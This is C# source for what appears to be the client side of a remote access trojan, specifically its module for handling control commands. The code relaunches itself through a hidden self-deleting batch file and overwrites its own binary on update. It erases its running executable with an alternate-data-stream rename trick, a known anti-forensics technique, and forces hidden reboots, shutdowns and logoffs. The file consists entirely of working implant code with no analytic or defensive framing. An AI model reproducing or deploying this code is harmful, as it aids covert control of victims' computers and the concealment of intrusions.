using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.HandlePacket
{
    internal class HandleOption
    {
        public static void Stop()
        {
            Disconnnect();
            Environment.Exit(0);
        }

        public static void Disconnnect()
        {
            try
            {
                Program.ClientWorking = false;
                Program.TCP_Socket.CloseConnection();
                Helper.Helper.CloseMutex();
            }
            catch { }
        }

        public static void Restart()
        {
            Disconnnect();
            var batch = Path.GetTempFileName() + ".bat";
            using (var sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 3 > NUL");
                sw.WriteLine("START " + "\"" + "\" " + "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);
        }

        public static void Update(byte[] NewFile)
        {
            try
            {
                var path = Process.GetCurrentProcess().MainModule.FileName;
                DeleteSelf();
                File.WriteAllBytes(path, NewFile);
            }
            catch { }
        }

        public static void DeleteSelf()
        {
            try
            {
                var ads = ":self";
                var path = Process.GetCurrentProcess().MainModule.FileName;
                var hCurrent = Native.CreateFileW(path, (uint)0x80110000L, 0x1, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
                var fileInformation = new Native.FILE_RENAME_INFO
                {
                    ReplaceIfExists = 0,
                    RootDirectory = IntPtr.Zero,
                    FileName = ads,
                    FileNameLength = (uint)Encoding.Unicode.GetBytes(ads).Length
                };
                var bsize = Marshal.SizeOf(fileInformation);
                var pfi = Marshal.AllocHGlobal(bsize);
                Marshal.StructureToPtr(fileInformation, pfi, false);
                Native.SetFileInformationByHandle(hCurrent, Native.FileInformationClass.FileRenameInfo, pfi, bsize);
                Marshal.FreeHGlobal(pfi);
                Native.CloseHandle(hCurrent);
                hCurrent = Native.CreateFileW(path, (uint)0x80110000L, 0x1, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
                var fileInformation2 = new Native.FILE_DISPOSITION_INFO
                {
                    DeleteFile = true
                };
                pfi = Marshal.AllocHGlobal(bsize);
                Marshal.StructureToPtr(fileInformation2, pfi, false);
                Native.SetFileInformationByHandle(hCurrent, Native.FileInformationClass.FileDispositionInfo, pfi, bsize);
                Marshal.FreeHGlobal(pfi);
                Native.CloseHandle(hCurrent);
            }
            catch { }
        }

        public static void ReBoot()
        {
            Disconnnect();
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c Shutdown /r /f /t 00",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        public static void PowerOff()
        {
            Disconnnect();
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c Shutdown /s /f /t 00",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        public static void LogOut()
        {
            Disconnnect();
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c Shutdown /l /f",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
    }
}